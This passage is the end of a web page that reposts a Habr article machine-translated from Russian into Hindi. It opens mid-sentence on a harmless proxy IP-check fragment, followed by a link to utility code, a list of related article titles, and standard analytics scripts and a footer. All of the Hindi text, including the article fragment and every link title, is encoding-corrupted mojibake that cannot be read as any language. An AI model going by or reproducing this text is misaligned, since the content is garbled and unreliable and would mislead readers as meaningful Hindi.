127.0.0.1:9011 https://ident.me</code> рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХреЛрдб рдпрд╣рд╛рдВ рдЙрдкрд▓рдмреНрдз рд╣реИред</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/hi432078/">https://habr.com/ru/post/hi432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../hi432068/index.html">рдЕрдВрдЧреНрд░реЗрдЬреА рдХреЗ рдЕрдзреНрдпрдпрди рдХреА рд╕реБрд╡рд┐рдзрд╛ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ: 5 рдЙрдкрдпреЛрдЧреА рд╕реЗрд╡рд╛рдПрдВ</a></li>
<li><a href="../hi432070/index.html">рд░реЗрдбрдХреНрд╕-рд╕рд╛рдЧрд╛ рдЪреИрдирд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ</a></li>
<li><a href="../hi432072/index.html">рдореЗрдореЛрд░реА рд▓реАрдХ рдХреЗ рддреАрди рдкреНрд░рдХрд╛рд░</a></li>
<li><a href="../hi432074/index.html">рдЦрд┐рд▓рд╛рдбрд╝реА рд╢реЙрдЯрдЧрди рдХреЗ рд╕рд╛рде рд╕реНрдкреЗрд▓реБрдирдХреА рд░рд┐рдпрд▓рд┐рдЯреА рдХрдкрдбрд╝реЗ рдХреЛ рдХреИрд╕реЗ рдлрд╛рдбрд╝рддреЗ рд╣реИрдВ</a></li>
<li><a href="../hi432076/index.html">рдЧреИрд░-рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдлрд╝рдВрдХреНрд╢рди рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ 5 рдмрд╛рд░ рдзреАрдорд╛ рдХрд░ рджреЗрддрд╛ рд╣реИ</a></li>
<li><a href="../hi432080/index.html">рдЬреЛрдЦрд┐рдо рдХрд╛ рдЖрдХрд▓рди рдХрд░рддреЗ рд╕рдордп рдЦрд┐рд▓рд╛рдбрд╝реА рдЧрд▓рддрдлрд╣рдореА рдХрд░рддреЗ рд╣реИрдВред рд╡рд┐рдХрд╛рд╕ рдореЗрдВ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╕рдВрдЦреНрдпрд╛ рдЬрдирд░реЗрдЯрд░ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг</a></li>
<li><a href="../hi432082/index.html">Microsoft AI рдЪреИрдЯрдмреЛрдЯ рдиреЗ рдЪрд╛рдЗрдирд╛ рдХреНрд▓реЛрдерд┐рдВрдЧ рдХрд▓реЗрдХреНрд╢рди рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛</a></li>
<li><a href="../hi432084/index.html">рд╣рдордиреЗ рдЙрддреНрдкрд╛рджрди рд╢реНрд░рдорд┐рдХреЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╢рд┐рдлреНрдЯ рдкреНрд░рддрд┐рдпреЛрдЧрд┐рддрд╛ рдХреА рд╡реНрдпрд╡рд╕реНрдерд╛ рдХреИрд╕реЗ рдХреА (рдпреВрдПрд╕рдПрд╕рдЖрд░ рдореЗрдВ)</a></li>
<li><a href="../hi432086/index.html">рдЕрдВрддрд░рд░рд╛рд╖реНрдЯреНрд░реАрдп рд╕реНрдХреВрд▓ рдореЗрдВ 3 рдбреА рдкреНрд░рд┐рдВрдЯрд┐рдВрдЧ рдПрдо.рд╡реА. рд▓реЛрдореЛрдиреЛрд╕реЛрд╡ рдХреЗ рдирд╛рдо рдкрд░</a></li>
<li><a href="../hi432088/index.html">GitHub рдкрд░ MySQL рдЙрдЪреНрдЪ рдЙрдкрд▓рдмреНрдзрддрд╛</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>